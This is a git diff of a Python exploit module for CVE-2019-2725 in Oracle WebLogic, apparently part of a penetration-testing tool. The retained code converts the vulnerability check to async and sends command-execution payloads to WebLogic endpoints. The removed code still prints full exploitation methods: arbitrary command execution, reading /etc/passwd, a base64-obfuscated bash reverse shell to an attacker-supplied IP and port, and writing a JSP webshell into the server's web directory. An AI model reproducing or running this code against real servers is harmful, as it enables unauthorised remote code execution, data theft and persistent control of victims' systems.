@@ -1,9 +1,8 @@
 #!/usr/bin/env python3
 
-import time
-from app.lib.utils.request import request
-from app.lib.utils.encode import base64encode
-from app.lib.utils.common import get_capta, get_useragent
+import asyncio
+from app.lib.request import request
+from app.lib.common import get_capta, get_useragent
 
 class CVE_2019_2725_BaseVerify:
     def __init__(self, url):
@@ -77,7 +76,7 @@ class CVE_2019_2725_BaseVerify:
             </soapenv:Envelope>       
         '''
     
-    def weblogic_10_3_6(self, cmd):
+    async def weblogic_10_3_6(self, cmd):
         
         '''
         执行weblogic 10.3.6的payload
@@ -88,21 +87,19 @@ class CVE_2019_2725_BaseVerify:
         '''
         
         try:
-            linux_req = request.post(self.url + '/_async/AsyncResponseService', headers = self.headers, data = self.linux_payload.format(cmd = cmd))
-            windows_req = request.post(self.url + '/_async/AsyncResponseService', headers = self.headers, data = self.windows_payload.format(cmd = cmd))
-            time.sleep(2)
-            check_req = request.get(self.url + '/_async/access.log', headers = self.headers)
-            if linux_req.status_code == 202 and check_req.status_code == 200:
-                return True, check_req.text
-            if windows_req.status_code == 202 and check_req.status_code == 200:
-                return True, check_req.text
-            return False
+            linux_req = await request.post(self.url + '/_async/AsyncResponseService', headers = self.headers, data = self.linux_payload.format(cmd = cmd))
+            windows_req = await request.post(self.url + '/_async/AsyncResponseService', headers = self.headers, data = self.windows_payload.format(cmd = cmd))
+            await asyncio.sleep(2)
+            check_req = await request.get(self.url + '/_async/access.log', headers = self.headers)
+            if linux_req.status == 202 and check_req.status == 200:
+                return True, await check_req.text()
+            if windows_req.status == 202 and check_req.status == 200:
+                return True, await check_req.text()
         except Exception as e:
-            return False
-        finally:
+            # print(e)
             pass
-        
-    def weblogic_12_1_3(self, cmd):
+
+    async def weblogic_12_1_3(self, cmd):
         
         '''
         执行weblogic 12.1.3的payload,此payload并不支持所有的命令,使用cat /etc/passwd命令就会失败,使用ls -la就可以
@@ -167,17 +164,14 @@ class CVE_2019_2725_BaseVerify:
             <soapenv:Body><asy:onAsyncDelivery/></soapenv:Body></soapenv:Envelope>
         '''%(cmd)
         try:
-            req = request.post(self.url + '/wls-wsat/CoordinatorPortType', headers = self.headers, data = payload)
-            if req.status_code == 200:
-                return True, req.text
-            else:
-                return False
+            req = await request.post(self.url + '/wls-wsat/CoordinatorPortType', headers = self.headers, data = payload)
+            if req.status == 200:
+                return True, await req.text()
         except Exception as e:
-            return False
-        finally:
+            # print(e)
             pass
 
-    def check(self):
+    async def check(self):
     
         """
         检测是否存在漏洞
@@ -188,7 +182,7 @@ class CVE_2019_2725_BaseVerify:
         """
         
         check_payload =  'echo %swin^dowslin$1ux' %(self.capta)
-        weblogic_10_3_6_check = self.weblogic_10_3_6(check_payload + ' > ./servers/AdminServer/tmp/_WL_internal/bea_wls9_async_response/8tpkys/war/access.log')
+        weblogic_10_3_6_check = await self.weblogic_10_3_6(check_payload + ' > ./servers/AdminServer/tmp/_WL_internal/bea_wls9_async_response/8tpkys/war/access.log')
         if weblogic_10_3_6_check:
             if 'linux' in weblogic_10_3_6_check[1] and self.capta in weblogic_10_3_6_check[1]:
                 self.osname = 'Linux'
@@ -196,7 +190,7 @@ class CVE_2019_2725_BaseVerify:
             if 'windows' in weblogic_10_3_6_check[1] and self.capta in weblogic_10_3_6_check[1]:
                 self.osname = 'Windows'
                 return True, 'weblogic_10_3_6', 'Windows'
-        weblogic_12_1_3_check = self.weblogic_12_1_3('echo %swin^dowslin$1ux' %(self.capta))
+        weblogic_12_1_3_check = await self.weblogic_12_1_3('echo %swin^dowslin$1ux' %(self.capta))
         if weblogic_12_1_3_check:
             if self.capta in weblogic_12_1_3_check[1] and ('windows' in weblogic_12_1_3_check[1] or 'linux' in weblogic_12_1_3_check[1]):
                 if 'linux' in weblogic_12_1_3_check[1]:
@@ -205,132 +199,7 @@ class CVE_2019_2725_BaseVerify:
                 elif 'windows' in weblogic_12_1_3_check[1]:
                     self.osname = 'windows'
                     return True, 'weblogic_12_1_3', 'Windows'
-        return False
-
-    def cmd(self, cmd):
-    
-        """
-        执行命令
-
-        :param str cmd: 要执行的命令
-
-        :return tuple result: 执行的结果
-        """
-
-        try:
-            check_result = self.check()
-            if check_result:
-                if check_result[1] == 'weblogic_10_3_6':
-                    cmd_result = self.weblogic_10_3_6(cmd + ' > ./servers/AdminServer/tmp/_WL_internal/bea_wls9_async_response/8tpkys/war/access.log')
-                    if check_result[2] == 'Linux':
-                        delete = self.weblogic_10_3_6('rm -f' + ' ./servers/AdminServer/tmp/_WL_internal/bea_wls9_async_response/8tpkys/war/access.log')
-                    else:
-                        delete = self.weblogic_10_3_6('del /q' + r' .\servers/AdminServer\tmp\_WL_internal\bea_wls9_async_response\8tpkys\war/access.log')
-                    return cmd_result[1]
-                else:
-                    cmd_result = self.weblogic_12_1_3(cmd)
-                    return True, cmd_result[1]
-            else:
-                return False, '不存在CVE-2019-2725漏洞'
-        except Exception as e:
-            return False, e
-        finally:
-            pass
-    
-    def read(self, filename):
-    
-        """
-        读取文件内容
-
-        :param str filename: 要读取的文件名字.
-
-        :return tuple result: 文件内容
-        """
-        
-        try:
-            check_result = self.check()
-            if check_result:
-                if check_result[1] == 'weblogic_10_3_6':
-                    readfile_result = self.weblogic_10_3_6('cat ' + filename + ' > ./servers/AdminServer/tmp/_WL_internal/bea_wls9_async_response/8tpkys/war/access.log')
-                    if check_result[2] == 'Linux':
-                        delete = self.weblogic_10_3_6('rm -f' + ' ./servers/AdminServer/tmp/_WL_internal/bea_wls9_async_response/8tpkys/war/access.log')
-                    else:
-                        delete = self.weblogic_10_3_6('del /q' + r' .\servers/AdminServer\tmp\_WL_internal\bea_wls9_async_response\8tpkys\war/access.log')
-                    return True, readfile_result[1]
-                else:
-                    return False, '存在CVE-2019-2725漏洞,但读取文件失败,请尝试cmd利用方式'
-            else:
-                return False, '不存在CVE-2019-2725漏洞'
-        except Exception as e:
-            return False, e
-        finally:
-            pass
-    
-    def reverse(self, ip, port):
-    
-        """
-        反弹shell
-
-        :param str ip: 要反弹的ip地址
-        :param str port: 要反弹的端口
-
-        :return tuple result: 反弹结果
-        """
-        
-        try:
-            check_result = self.check()
-            if check_result:
-                reverse_command = "bash -i >& /dev/tcp/{ip}/{port} 0>&1 &".format(ip = ip, port = port)
-                reverse_command = "{echo,%s}|{base64,-d}|{bash,-i}" % (base64encode(reverse_command))
-                if check_result[1] == 'weblogic_10_3_6':
-                    if check_result[2] == 'Linux':
-                        reverse_result = request.post(self.url + '/_async/AsyncResponseService', headers = self.headers, data = self.linux_payload.format(cmd = reverse_command))
-                    else:
-                        return False, '存在漏洞,但插件CVE-2019-2725暂不支持Windows系统反弹shell,请尝试cmd利用方式'
-                    return True, '反弹会话命令已发送,可到会话管理模块查看是否有会话反弹'
-                else:
-                    return False, '存在CVE-2019-2725漏洞,但利用失败,请尝试cmd利用方式'
-            else:
-                return False, '不存在CVE-2019-2725漏洞'
-        except Exception as e:
-            return False, e
-        finally:
-            pass
-    
-    def webshell(self, filename):
-    
-        """
-        写入shell文件
-
-        :param str filename: 写入的shell文件名字
-    
-        :return tuple result: 写入结果
-        """
-        try:
-            check_result = self.check()
-            if check_result:
-                with open('app/static/cmd_jsp.jsp', 'r', encoding = 'utf-8') as reader:
-                    jsp_data = reader.read()
-                if check_result[1] == 'weblogic_10_3_6':
-                    if check_result[2] == 'Linux':
-                        webshell_result = request.post(self.url + '/_async/AsyncResponseService', headers = self.headers, data = self.linux_payload.format(cmd = 'echo "%s" | base64 -d | tee ./servers/AdminServer/tmp/_WL_internal/bea_wls9_async_response/8tpkys/war/%s.jsp' %(base64encode(jsp_data), filename)))
-                        check_shell_req = request.get(self.url + '/_async/%s.jsp' % (filename))
-                        if check_shell_req.status_code == 200:
-                            return True, self.url + '/_async/%s.jsp' % (filename)
-                    else:
-                        return False, '存在漏洞,但上传webshell失败, 请尝试cmd利用方式'
-                else:
-                    return False, '存在CVE-2019-2725漏洞,但上传shell文件失败,请尝试cmd利用方式'
-            else:
-                return False, '不存在CVE-2019-2725漏洞'
-        except Exception as e:
-            return False, e
-        finally:
-            pass
 
 if __name__ == '__main__':
     CVE_2019_2725 = CVE_2019_2725_BaseVerify('http://127.0.0.1:7001')
-    print(CVE_2019_2725.cmd('whoami'))
-    print(CVE_2019_2725.read('/etc/passwd'))
-
 
